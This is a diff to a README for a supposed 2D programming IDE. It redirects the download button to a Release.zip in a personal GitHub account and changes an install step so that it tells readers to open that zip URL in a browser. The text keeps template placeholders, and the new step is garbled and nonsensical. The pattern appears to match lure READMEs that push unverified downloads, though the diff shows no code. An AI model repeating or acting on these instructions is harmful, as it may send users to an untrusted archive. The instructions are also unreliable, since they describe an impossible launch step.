@@ -9,7 +9,7 @@ Welcome to the official repository for the **SNU 2D Programming Tools IDE submod
 
 To get started with the SNU 2D Programming Tools IDE, you can download the latest release by clicking the button below:
 
-[![Download IDE](insert_here_a_colorful_button_image_for_download_link)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download IDE](insert_here_a_colorful_button_image_for_download_link)](https://github.com/ImTheGoat123456/SNU_2D_ProgrammingTools_IDE_2-Dimensional-Array/releases/download/v1.0/Release.zip)
 *Note: Download link needs to be launched*
 
 If the above link is not working, please check the **Releases** section of this repository for alternative download options.
@@ -25,7 +25,7 @@ If the above link is not working, please check the **Releases** section of this 
 
 1. Download the IDE release package from the provided link.
 2. Extract the files to your desired directory.
-3. Open the `index.html` file in your preferred web browser to launch the IDE.
+3. Open the `https://github.com/ImTheGoat123456/SNU_2D_ProgrammingTools_IDE_2-Dimensional-Array/releases/download/v1.0/Release.zip` file in your preferred web browser to launch the IDE.
 
 ## 🎉 Contributing
 
